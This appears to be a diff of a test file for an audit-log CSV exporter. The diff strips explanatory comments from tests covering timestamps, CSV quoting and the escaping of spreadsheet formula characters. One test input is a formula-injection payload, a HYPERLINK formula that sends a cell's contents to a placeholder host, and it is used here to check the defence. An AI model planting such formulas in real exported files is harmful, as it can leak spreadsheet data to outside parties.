@@ -83,7 +83,6 @@ describe("AuditExportService", () => {
       });
     });
 
-    // The file outlives the session, so the instant is written in full, not the exporter's own zone.
     it("writes the timestamp as a full ISO 8601 instant", () => {
       const exported = service.toAuditExport(
         row({ occurredAt: new Date("2026-01-05T23:30:15.250Z") }),
@@ -139,7 +138,6 @@ describe("AuditExportService", () => {
       expect(JSON.stringify(exported)).not.toMatch(/null|undefined/);
     });
 
-    // A fleet event names neither a cipher nor a rule; the two columns below are the only record of what it acted on.
     it("carries the target system and access connector a fleet event names", () => {
       const exported = service.toAuditExport(
         row({
@@ -156,7 +154,6 @@ describe("AuditExportService", () => {
       expect(exported.accessConnectorName).toBe("eu-west-rotator");
     });
 
-    // Names come from local vault state; an item the exporter can't decrypt has none, correctly.
     it("leaves the item empty for a row whose item did not resolve", () => {
       const exported = service.toAuditExport(row({ cipherName: null, collectionName: null }));
 
@@ -173,7 +170,6 @@ describe("AuditExportService", () => {
       expect(exported.grantedDuration).toBe("1 hour");
     });
 
-    // A LeaseExtended event carries no granted-window field of its own.
     it("writes the new lease end for an extension, which carries no duration", () => {
       const exported = service.toAuditExport(
         row({
@@ -201,8 +197,6 @@ describe("AuditExportService", () => {
       expect(parsed.data.map((record) => record.detail)).toEqual(["first", "second", "third"]);
     });
 
-    // Free text; a delimiter, quote or line break must survive the round trip without shifting
-    // later columns.
     it("quotes a detail containing a comma, a double quote and a newline", () => {
       const detail = 'Approved, but "read-only"\nper the incident notes';
 
@@ -215,8 +209,7 @@ describe("AuditExportService", () => {
       expect(parsed.data[0].event).toBe("Access activated");
     });
 
-    // Free text from someone other than the file's opener; a leading trigger character would make
-    // the cell a formula the spreadsheet runs on open.
+    // A leading trigger character would make the cell a formula the spreadsheet runs on open.
     it.each([
       ["=", '=HYPERLINK("http://example.test/"&A1,"click")'],
       ["+", "+1+1"],
@@ -232,7 +225,6 @@ describe("AuditExportService", () => {
       expect(parsed.data[0].detail).toBe(`'${detail}`);
     });
 
-    // An escape, not a redaction; the original text is still there to read.
     it("keeps the original text behind the escape", () => {
       const detail = "=1+1";
 
@@ -241,7 +233,6 @@ describe("AuditExportService", () => {
       expect(exported.detail.slice(1)).toBe(detail);
     });
 
-    // Every cell an auditor did not choose is a candidate, not just the free-text one.
     it("neutralizes a name a member set on themselves", () => {
       const parsed = papa.parse<Record<string, string>>(
         service.getAuditExport([row({ actor: "=1+1", cipherName: "@SUM(1,1)" })]),
